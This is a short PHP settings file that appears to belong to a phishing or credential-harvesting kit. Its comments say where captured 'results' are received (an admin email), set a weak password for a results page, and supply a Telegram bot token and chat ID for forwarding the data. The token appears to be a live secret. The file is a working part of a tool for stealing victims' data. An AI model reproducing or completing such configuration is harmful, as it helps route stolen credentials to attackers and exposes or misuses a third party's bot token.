<?php 
 

// THIS WHERE YOU WILL RECIEVE RESULTS
$admin_email = 'asd@gsil.com';


// PASSWORD TO ENTER TO RESULTS PAGE
$admin_password = '12345';




//Have a telegram bot? put the tokens here :D
$telegam_bot_token = "5274674353:AAFLxcUO6e14to_0pUOmNObzbJ5gRiOo3Go";
$telegam_chatID = "-739348386";
?>  